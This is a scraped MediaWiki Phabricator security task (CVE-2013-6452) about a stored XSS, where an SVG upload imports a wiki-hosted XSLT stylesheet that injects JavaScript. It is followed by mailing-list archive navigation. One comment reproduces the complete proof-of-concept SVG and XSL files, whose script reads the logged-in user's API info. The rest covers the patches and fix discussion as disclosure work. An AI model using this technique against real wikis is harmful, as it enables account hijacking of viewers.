=== Content from bugzilla.wikimedia.org_ed68ad19_20250126_104134.html ===
Page Menu[HomePhabricator](/)

* SearchConfigure Global Search

[Log In](https://phabricator.wikimedia.org/auth/start/?next=%2FT59550)[Create Task](/maniphest/task/edit/nocreate/) [Maniphest](/maniphest/)  T59550
# SVG XSLT XSSClosed, Resolved[Public](/policy/explain/PHID-TASK-tp7qwpzhn6gf6djpgjvr/view/)Actions

* [Edit Task](/maniphest/task/edit/59550/)
* Edit Related Tasks...
* [Create Subtask](/maniphest/task/subtask/59550/)
* [Edit Parent Tasks](/search/rel/task.has-parent/PHID-TASK-tp7qwpzhn6gf6djpgjvr/)
* [Edit Subtasks](/search/rel/task.has-subtask/PHID-TASK-tp7qwpzhn6gf6djpgjvr/)
* [Merge Duplicates In](/search/rel/task.merge-in/PHID-TASK-tp7qwpzhn6gf6djpgjvr/)
* [Close As Duplicate](/search/rel/task.close-as-duplicate/PHID-TASK-tp7qwpzhn6gf6djpgjvr/)
* Edit Related Objects...
* [Edit Commits](/search/rel/task.has-commit/PHID-TASK-tp7qwpzhn6gf6djpgjvr/)
* [Edit Mocks](/search/rel/task.has-mock/PHID-TASK-tp7qwpzhn6gf6djpgjvr/)
* Subscribe
* [Mute Notifications](/subscriptions/mute/PHID-TASK-tp7qwpzhn6gf6djpgjvr/)
* [Protect as security issue](/wmf/escalate-task/59550/)
* [Award Token](/token/give/PHID-TASK-tp7qwpzhn6gf6djpgjvr/)
* [Flag For Later](/flag/edit/PHID-TASK-tp7qwpzhn6gf6djpgjvr/)

Assigned ToNoneAuthored By

|  | [• csteipp](/p/csteipp/) |
| --- | --- |
| Nov 25 2013, 6:25 PM2013-11-25 18:25:00 (UTC+0) |

Tags

* [MediaWiki-Uploading](/tag/mediawiki-uploading/)
* [Multimedia](/tag/multimedia/) [(Done)](/project/board/48/)
* [Vuln-XSS](/tag/vuln-xss/)
* [Security](/tag/security/)
Referenced Files

|  | [F12041: bug57550\_122.patch](/F12041) |
| --- | --- |
| Nov 22 2014, 2:16 AM2014-11-22 02:16:34 (UTC+0) |

|  | [F12040: bug57550\_121.patch](/F12040) |
| --- | --- |
| Nov 22 2014, 2:16 AM2014-11-22 02:16:34 (UTC+0) |

|  | [F12039: bug57550\_119.patch](/F12039) |
| --- | --- |
| Nov 22 2014, 2:16 AM2014-11-22 02:16:33 (UTC+0) |

|  | [F12038: bug57550.patch](/F12038) |
| --- | --- |
| Nov 22 2014, 2:16 AM2014-11-22 02:16:32 (UTC+0) |

Subscribers

|  | [Bawolff](/p/Bawolff/) |
| --- | --- |

|  | [• csteipp](/p/csteipp/) |
| --- | --- |

|  | [David\_Gerard](/p/David_Gerard/) |
| --- | --- |

|  | [• Fabrice\_Florin](/p/Fabrice_Florin/) |
| --- | --- |

|  | [Grunny](/p/Grunny/) |
| --- | --- |

|  | [Luke081515](/p/Luke081515/) |
| --- | --- |

|  | [MarkAHershberger](/p/MarkAHershberger/) |
| --- | --- |

[View All 13 Subscribers](/subscriptions/list/PHID-TASK-tp7qwpzhn6gf6djpgjvr/)
# Description

Reported by Chris Davis

Hi chaps,

Had a bit of brainwave today about an exciting new way to execute javascript in to SVG files uploaded to mediawiki, or more accurately to put it in an XSLT stylesheet that a specially crafted "SVG" file imports.

This vulnerability could be used to hijack the account of anyone who views an image on an instance of mediawiki, or deliver a flood of spam anonymously.

A live demo exists over on RationalWiki, though I'd like to take it down soon so if you can confirm as soon as possible I'd be grateful:

The SVG exists at: <http://rationalwiki.org/w/images/0/03/Silly_mediawiki.svg>

Which imports a stylesheet: [http://rationalwiki.org/wiki/User:Jeeves/test.xsl](http://rationalwiki.org/wiki/User%3AJeeves/test.xsl)

There's probably an element of browser compatibility because it relies on the browser sensibly parsing XSL. I tested on Chrome & Firefox on Windows.

The live example simply executes a little XMLHTTTPRequest that queries the API for the currently logged in user and alerts the user with the struct passed back. Obviously you could craft a more malicious and less obtrusive payload.

The technical details are:

1. An XSL document is crafted to assemble an SVG which will include an executable payload, such as a script tag.
2. The XSL document is written to page on the wiki.
3. An XML document that looks minimally like an SVG file is crafted to fool the input validation. This XML document imports the XSL as a stylesheet.
4. The XML document is uploaded to the image as an SVG file.
5. The file looks like a picture to anyone viewing it, but executes javascript to possibly nasty things.

Just view souce on the working example for more details.

Please confirm soonest.

Cheers,

```
Chris.
```

---

**Version**: unspecified

**Severity**: normal

# Details

Reference bz57550
# Related ObjectsSearch...

* Task Graph

|  |  | Status | Subtype | Assigned | Task |
| --- | --- | --- | --- | --- | --- |
|  |  |  |  |  | Restricted Task |
|  |  | Resolved |  | *None* | T59550 [SVG XSLT XSS](/T59550) |

### Event Timeline

[• bzimport](/p/bzimport/) raised the priority of this task from  to Unbreak Now!.[Nov 22 2014, 2:16 AM2014-11-22 02:16:31 (UTC+0)](#599802)[• bzimport](/p/bzimport/) added a project: [MediaWiki-Uploading](/tag/mediawiki-uploading/).[• bzimport](/p/bzimport/) set Reference to bz57550.[• bzimport](/p/bzimport/) added a subscriber: Unknown Object (MLST).[• csteipp](/p/csteipp/) created this task.[Nov 25 2013, 6:25 PM2013-11-25 18:25:00 (UTC+0)](#599811)[• csteipp](/p/csteipp/) added a comment.[Nov 25 2013, 6:28 PM2013-11-25 18:28:19 (UTC+0)](#599815)Comment Actions

Here's the content of the demo files for reproduction.

SVG:

<?xml version="1.0" ?>

<?xml-stylesheet type="text/xsl" href="/w/index.php?title=User:Jeeves/test.xsl&amp;action=raw&amp;format=xml" ?>

<svg>

```
<height>50</height>
<width>100</width>
```

</svg>

XSL:

<?xml version="1.0"?>

<xsl:stylesheet version="1.0"

```
		xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
		xmlns="http://www.w3.org/2000/svg"
		>
  <xsl:output
      method="xml"
      indent="yes"
      standalone="no"
      doctype-public="-//W3C//DTD SVG 1.1//EN"
      doctype-system="http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"
      media-type="image/svg" />

  <xsl:template match="svg">
    <svg xmlns="http://www.w3.org/2000/svg" width="200" height="200" >
      <rect x="10" y="10" width="{width}"
	    height="{height}" fill="red" stroke="black"/>
    <script type="text/javascript"><![CDATA[
      function dostuff() {
```

var xmlhttp=new XMLHttpRequest();

xmlhttp.open("GET","/w/api.php?action=query&meta=userinfo&format=txt",false);

xmlhttp.send();

alert(xmlhttp.responseText);

```
     }

     dostuff();
  ]]></script>
  </svg>
</xsl:template>
```

</xsl:stylesheet>

[• csteipp](/p/csteipp/) added a comment.[Nov 26 2013, 9:37 PM2013-11-26 21:37:11 (UTC+0)](#599834)Comment Actions

Created attachment 13914

Disallow stylesheets in svg processing instructions

Patch to set a processing instruction handler in XmlTypeCheck, and the SVG processing uses that to disallow setting xml-stylesheet.

We could make it more specific to only disallow certain types of stylesheets, but I'd rather disallow them all, and whitelist any we need. I have 20k test images from commons, and none set an xml-stylesheet, so I think we're fairly safe just forbidding it.

I'd appreciate comments on the fix. I'll backport it to 1.19 for rationalwiki.

**Attached**: bug57550.patch3 KB[Download](https://phab.wmfusercontent.org/file/download/kdx5aa2lx7zpc6idzyfe/PHID-FILE-v6conkmkgt7bf3vlwe7n/bug57550.patch)

[• csteipp](/p/csteipp/) added a comment.[Nov 26 2013, 10:12 PM2013-11-26 22:12:18 (UTC+0)](#599845)Comment Actions

Created attachment 13916

Disallow stylesheets in svg processing instructions (1.19 branch)

**Attached**: bug57550\_119.patch3 KB[Download](https://phab.wmfusercontent.org/file/download/x7q55jr3ivb4xnpfqsti/PHID-FILE-5kpfiypkqbqpfuoei2tf/bug57550_119.patch)

[tstarling](/p/tstarling/) added a comment.[Dec 16 2013, 2:56 AM2013-12-16 02:56:13 (UTC+0)](#599851)Comment Actions

This change is probably fine, but in looking at this type check code, I see a pre-existing issue that might allow it to be bypassed. A failure of xml\_parse() will lead to the upload being accepted, so if it's possible to write an XML file that fails in xml\_parse() but is accepted by a browser, then all the SVG checks would be bypassed, including this one.

I think that in UploadBase::detectScriptInSvg(), the upload should be rejected if $check->wellFormed is false.

[• csteipp](/p/csteipp/) added a comment.[Dec 23 2013, 6:27 PM2013-12-23 18:27:48 (UTC+0)](#599857)Comment Actions

This has been assigned CVE-2013-6452

[Mglaser](/p/Mglaser/) added a comment.[Jan 8 2014, 11:06 PM2014-01-08 23:06:09 (UTC+0)](#599872)Comment Actions

Created attachment 14260

Disallow stylesheets in svg processing instructions (1.21 branch)

**Attached**: bug57550\_121.patch3 KB[Download](https://phab.wmfusercontent.org/file/download/rma5hizvkerlylpx4jmq/PHID-FILE-gfhiu72nsv33qhllwls6/bug57550_121.patch)

[Mglaser](/p/Mglaser/) added a comment.[Jan 8 2014, 11:07 PM2014-01-08 23:07:01 (UTC+0)](#599883)Comment Actions

Created attachment 14261

Disallow stylesheets in svg processing instructions (1.22 branch)

**Attached**: bug57550\_122.patch3 KB[Download](https://phab.wmfusercontent.org/file/download/vajdtcydpyckm2cfrx4q/PHID-FILE-d53oo36fj4cymeodcwst/bug57550_122.patch)

[David\_Gerard](/p/David_Gerard/) added a comment.[Jan 14 2014, 11:36 AM2014-01-14 11:36:01 (UTC+0)](#599904)Comment Actions

In my role as sysadmin at RationalWiki.org, I just upgraded it to 1.19.10 - or thought I had - and Chris Davis' 'sploit link still runs the demo 'sploit for me:

<http://rationalwiki.org/w/images/0/03/Silly_mediawiki.svg>

Looking at includes/XmlTypeCheck.php and includes/upload/UploadBase.php in the RW installation, the patches in attachment 13916 appear to be present.

Should the demo 'sploit still work?

[MarkAHershberger](/p/MarkAHershberger/) added a comment.[Jan 14 2014, 12:27 PM2014-01-14 12:27:58 (UTC+0)](#599910)Comment Actions

(In reply to comment #8)

> Should the demo 'sploit still work?

From what I understand: the already-uploaded demo will continue to work, but you shouldn't be able to upload it any more.

[David\_Gerard](/p/David_Gerard/) added a comment.[Jan 14 2014, 1:03 PM2014-01-14 13:03:19 (UTC+0)](#599928)Comment Actions

Yeah, that'll do. Thank you :-) I just tested and get "This file contains HTML or script code that may be erroneously interpreted by a web browser." which is precisely right.

The original demo 'sploit SVG is still present in the file tree, so the link will work for an unspecified future length of time (probably until next major upgrade).

[• csteipp](/p/csteipp/) added a comment.[Jan 14 2014, 3:17 PM2014-01-14 15:17:33 (UTC+0)](#599934)Comment Actions

(In reply to comment #8)

> In my role as sysadmin at RationalWiki.org, I just upgraded it to 1.19.10 -
>
> or
>
> thought I had - and Chris Davis' 'sploit link still runs the demo 'sploit for
>
> me:
>
> <http://rationalwiki.org/w/images/0/03/Silly_mediawiki.svg>
>
> Looking at includes/XmlTypeCheck.php and includes/upload/UploadBase.php in
>
> the
>
> RW installation, the patches in attachment 13916 [details] appear to be
>
> present.
>
> Should the demo 'sploit still work?

Yes, the patch prevents the upload, but existing files will still be there.

Grepping for "<?xml-stylesheet" in your images would identify any that have previously come in.

[• Gilles](/p/Gilles/) added a project: [Multimedia](/tag/multimedia/).[Dec 4 2014, 9:26 AM2014-12-04 09:26:33 (UTC+0)](#809710)[• Gilles](/p/Gilles/) moved this task from [Untriaged](/project/board/48/) to [Done](/project/board/48/) on the [Multimedia](/tag/multimedia/) board.[Dec 4 2014, 10:10 AM2014-12-04 10:10:30 (UTC+0)](#810355)[• csteipp](/p/csteipp/) added a project: [acl\*security](/tag/acl_security/).[Mar 26 2015, 8:39 PM2015-03-26 20:39:04 (UTC+0)](#1154553)[• csteipp](/p/csteipp/) added a project: [Vuln-XSS](/tag/vuln-xss/).[Aug 20 2015, 10:09 PM2015-08-20 22:09:08 (UTC+0)](#1559018)Restricted Application added subscribers: [Steinsplitter](/p/Steinsplitter/), [Matanya](/p/Matanya/).  · [View Herald Transcript](/herald/transcript/895949/)[Aug 20 2015, 10:09 PM2015-08-20 22:09:08 (UTC+0)](#1559019)[• MZMcBride](/p/MZMcBride/) subscribed.[Aug 20 2015, 10:09 PM2015-08-20 22:09:34 (UTC+0)](#1559023)[Luke081515](/p/Luke081515/) removed a subscriber: [• wikibugs-l-list](/p/wikibugs-l-list/).[Jan 28 2016, 5:57 PM2016-01-28 17:57:28 (UTC+0)](#1974846)Restricted Application added a subscriber: [Luke081515](/p/Luke081515/).  · [View Herald Transcript](/herald/transcript/1148232/)[Jan 28 2016, 5:57 PM2016-01-28 17:57:28 (UTC+0)](#1974847)[• chasemp](/p/chasemp/) added a project: [Security](/tag/security/).[Feb 10 2020, 10:50 PM2020-02-10 22:50:49 (UTC+0)](#5867223) · [• chasemp](/p/chasemp/) removed a project: [acl\*security](/tag/acl_security/).[Feb 20 2020, 8:11 PM2020-02-20 20:11:42 (UTC+0)](#5903037) · [Log In to Comment](/login/?next=)Content licensed under Creative Commons Attribution-ShareAlike (CC BY-SA) 4.0 unless otherwise noted; code licensed under GNU General Public License (GPL) 2.0 or later and other open source licenses. By using this site, you agree to the Terms of Use, Privacy Policy, and Code of Conduct. · [Wikimedia Foundation](https://wikimediafoundation.org/) · [Privacy Policy](https://foundation.wikimedia.org/wiki/Special%3AMyLanguage/Policy%3ANon-wiki_privacy_policy) · [Code of Conduct](https://www.mediawiki.org/wiki/Special%3AMyLanguage/Code_of_Conduct) · [Terms of Use](https://foundation.wikimedia.org/wiki/Special%3AMyLanguage/Policy%3ATerms_of_Use/Phabricator) · [Disclaimer](https://foundation.wikimedia.org/wiki/Special%3AMyLanguage/Policy%3AGeneral_disclaimer) · [CC-BY-SA](https://creativecommons.org/licenses/by-sa/4.0/) · [GPL](https://www.gnu.org/licenses/old-licenses/gpl-2.0.html) · [Credits](https://www.mediawiki.org/wiki/Phabricator/Credits)

=== Content from lists.wikimedia.org_69eea16e_20250125_174246.html ===


[lists.wikimedia.org](/hyperkitty/)

[Sign In](/accounts/login/?next=/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/message/YUPPCCDXJ4GDG6XKKN67URP2U2GDTI7A/)
[Sign Up](/accounts/signup/?next=/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/message/YUPPCCDXJ4GDG6XKKN67URP2U2GDTI7A/)

* [Sign In](/accounts/login/?next=/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/message/YUPPCCDXJ4GDG6XKKN67URP2U2GDTI7A/)
* [Sign Up](/accounts/signup/?next=/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/message/YUPPCCDXJ4GDG6XKKN67URP2U2GDTI7A/)

* [Manage this list](/postorius/lists/mediawiki-announce.lists.wikimedia.org/)

×
#### Keyboard Shortcuts

### Thread View

* `j`: Next unread message
* `k`: Previous unread message
* `j a`: Jump to all threads* `j l`: Jump to MailingList overview

### 2025

* [January](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2025/1/)

### 2024

* [December](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2024/12/)
* [November](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2024/11/)
* [October](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2024/10/)
* [September](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2024/9/)
* [August](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2024/8/)
* [July](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2024/7/)
* [June](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2024/6/)
* [May](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2024/5/)
* [April](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2024/4/)
* [March](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2024/3/)
* [February](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2024/2/)
* [January](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2024/1/)

### 2023

* [December](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2023/12/)
* [November](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2023/11/)
* [October](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2023/10/)
* [September](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2023/9/)
* [August](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2023/8/)
* [July](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2023/7/)
* [June](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2023/6/)
* [May](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2023/5/)
* [April](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2023/4/)
* [March](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2023/3/)
* [February](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2023/2/)
* [January](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2023/1/)

### 2022

* [December](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2022/12/)
* [November](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2022/11/)
* [October](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2022/10/)
* [September](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2022/9/)
* [August](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2022/8/)
* [July](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2022/7/)
* [June](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2022/6/)
* [May](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2022/5/)
* [April](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2022/4/)
* [March](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2022/3/)
* [February](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2022/2/)
* [January](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2022/1/)

### 2021

* [December](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2021/12/)
* [November](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2021/11/)
* [October](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2021/10/)
* [September](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2021/9/)
* [August](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2021/8/)
* [July](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2021/7/)
* [June](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2021/6/)
* [May](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2021/5/)
* [April](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2021/4/)
* [March](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2021/3/)
* [February](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2021/2/)
* [January](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2021/1/)

### 2020

* [December](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2020/12/)
* [November](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2020/11/)
* [October](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2020/10/)
* [September](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2020/9/)
* [August](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2020/8/)
* [July](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2020/7/)
* [June](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2020/6/)
* [May](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2020/5/)
* [April](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2020/4/)
* [March](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2020/3/)
* [February](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2020/2/)
* [January](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2020/1/)

### 2019

* [December](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2019/12/)
* [November](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2019/11/)
* [October](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2019/10/)
* [September](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2019/9/)
* [August](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2019/8/)
* [July](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2019/7/)
* [June](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2019/6/)
* [May](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2019/5/)
* [April](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2019/4/)
* [March](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2019/3/)
* [February](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2019/2/)
* [January](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2019/1/)

### 2018

* [December](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2018/12/)
* [November](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2018/11/)
* [October](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2018/10/)
* [September](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2018/9/)
* [August](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2018/8/)
* [July](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2018/7/)
* [June](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2018/6/)
* [May](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2018/5/)
* [April](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2018/4/)
* [March](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2018/3/)
* [February](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2018/2/)
* [January](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2018/1/)

### 2017

* [December](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2017/12/)
* [November](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2017/11/)
* [October](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2017/10/)
* [September](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2017/9/)
* [August](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2017/8/)
* [July](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2017/7/)
* [June](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2017/6/)
* [May](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2017/5/)
* [April](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2017/4/)
* [March](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2017/3/)
* [February](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2017/2/)
* [January](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2017/1/)

### 2016

* [December](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2016/12/)
* [November](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2016/11/)
* [October](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2016/10/)
* [September](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2016/9/)
* [August](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2016/8/)
* [July](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2016/7/)
* [June](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2016/6/)
* [May](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2016/5/)
* [April](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2016/4/)
* [March](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2016/3/)
* [February](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2016/2/)
* [January](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2016/1/)

### 2015

* [December](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2015/12/)
* [November](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2015/11/)
* [October](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2015/10/)
* [September](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2015/9/)
* [August](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2015/8/)
* [July](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2015/7/)
* [June](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2015/6/)
* [May](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2015/5/)
* [April](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2015/4/)
* [March](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2015/3/)
* [February](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2015/2/)
* [January](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2015/1/)

### 2014

* [December](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2014/12/)
* [November](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2014/11/)
* [October](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2014/10/)
* [September](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2014/9/)
* [August](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2014/8/)
* [July](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2014/7/)
* [June](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2014/6/)
* [May](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2014/5/)
* [April](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2014/4/)
* [March](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2014/3/)
* [February](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2014/2/)
* [January](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2014/1/)

### 2013

* [December](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2013/12/)
* [November](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2013/11/)
* [October](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2013/10/)
* [September](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2013/9/)
* [August](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2013/8/)
* [July](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2013/7/)
* [June](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2013/6/)
* [May](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2013/5/)
* [April](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2013/4/)
* [March](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2013/3/)
* [February](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2013/2/)
* [January](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2013/1/)

### 2012

* [December](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2012/12/)
* [November](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2012/11/)
* [October](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2012/10/)
* [September](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2012/9/)
* [August](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2012/8/)
* [July](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2012/7/)
* [June](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2012/6/)
* [May](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2012/5/)
* [April](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2012/4/)
* [March](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2012/3/)
* [February](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2012/2/)
* [January](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2012/1/)

### 2011

* [December](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2011/12/)
* [November](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2011/11/)
* [October](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2011/10/)
* [September](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2011/9/)
* [August](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2011/8/)
* [July](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2011/7/)
* [June](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2011/6/)
* [May](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2011/5/)
* [April](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2011/4/)
* [March](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2011/3/)
* [February](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2011/2/)
* [January](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2011/1/)

### 2010

* [December](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2010/12/)
* [November](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2010/11/)
* [October](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2010/10/)
* [September](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2010/9/)
* [August](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2010/8/)
* [July](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2010/7/)
* [June](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2010/6/)
* [May](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2010/5/)
* [April](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2010/4/)
* [March](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2010/3/)
* [February](/hyperkitty/list/mediawiki-announce%40lists.wikimedia.org/2010/2/)
